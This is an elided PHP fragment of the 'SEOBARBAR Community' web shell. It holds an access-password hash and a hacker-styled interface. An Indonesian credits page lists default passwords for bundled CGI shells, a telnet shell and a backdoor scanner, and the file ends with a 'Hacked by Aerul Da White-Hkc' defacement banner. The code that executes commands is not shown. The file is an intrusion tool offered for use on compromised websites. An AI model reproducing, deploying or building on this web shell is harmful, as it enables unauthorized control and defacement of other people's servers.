<?php
/*********************************************************************************************************/
$auth_pass = "969b9ad0af112f5a9516b43c9d9ec028";
/*********************************************************************************************************/
$color = "#00ff00";
...
@define('VERSION', 'SEOBARBAR Community');
...
<style type="text/css">
		...
		body{ background-color:transparan;background:#000;background-image: url("https://seobarbar.com/seobg.png");background-position: center;    background-attachment: fixed;background-repeat: no-repeat; }
		...
		*{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; }
		#menu{ background:#000; margin:2px 2px 2px 10cm; }
		#menu a{ padding:4px 15px; margin:0; background:#4B236B; text-decoration:none; letter-spacing:2px; -moz-border-radius: 5px; -webkit-border-radius: 15px; -khtml-border-radius: 15px; border-radius: 7px; }
...
<tr>
<td>
<a href="?"><span class="b1"><img src="https://i.postimg.cc/wjfJJ8c2/SEOBARBAR-SILVER.png" width="350" height="219" border="0"></span></a></td>
</tr>
<tr>
...
<center><br><br><font size=2> <img src="https://i.postimg.cc/wjfJJ8c2/SEOBARBAR-SILVER.png" width="319" height="119" border="0"> <br> <br> Saya mengucapkan terima kasih banyak kepada teman-teman cyber seperjuangan atas kerjasama dan dukungannya selama ini <br>  Karena tanpa teman teman saya bukanlah apa-apa dan bukanlah siapa-siapa... <br> Dan saya berharap dengan perilisan SEOBARBAR v4 ini mendapatkan saran membangun demi penyempurnaan yang lebih baik kedepan<br>"KEEP CALM AND BE DANGEROUS"<br><br> Sedikit keterangan untuk yg belum tau <br> CGI-Shell Passwd : 123456 <br> CGI-Telnet 2012 Passwd : bandungkotasampah <br> CGI Litespeed Passwd : aerulcyber <br> Backdoor Scanner Passwd : aerulcyber <br> Dan seterusnya<br><br>Special Thanks To : <br>|Bagsfreakz| |Doza Cracker| |s4l1ty| |Rio Permana| |Angel Dot ID| |Derry| |G4L03_05| |S.A.Z BadboY| |Juna HKC| |Teguh HKC| |Miss QQ| |Bang Devilz| <br>|Meninbox| |Lindo Kng'Crew| |Uyap Castol| |X'Inject| |Unknown_R| |KraVcux PiRantes| |Ksatria Us| |Budz Story| |Dicky Cyber| |Billy Cyber|  |Om Jin|
<br>|SEOBARBAR Community| |Aceh Cyber Team| |Surabaya Blackhat| |Indonesian Backtrack Team Reg Sumut| |Indonesian Fighter Cyber| |Blackshadow| |Indonesian Security Down| <br> |Borneo Attacker| |Biang Kerox Hacker Team| 
...
<span style="color: #ff0000;"> <center>Hacked by Aerul Da White-Hkc - SEOBARBAR Community <br> contact : http://fb.me/hackerkocancommunity <center>
</html>
</textarea><br>
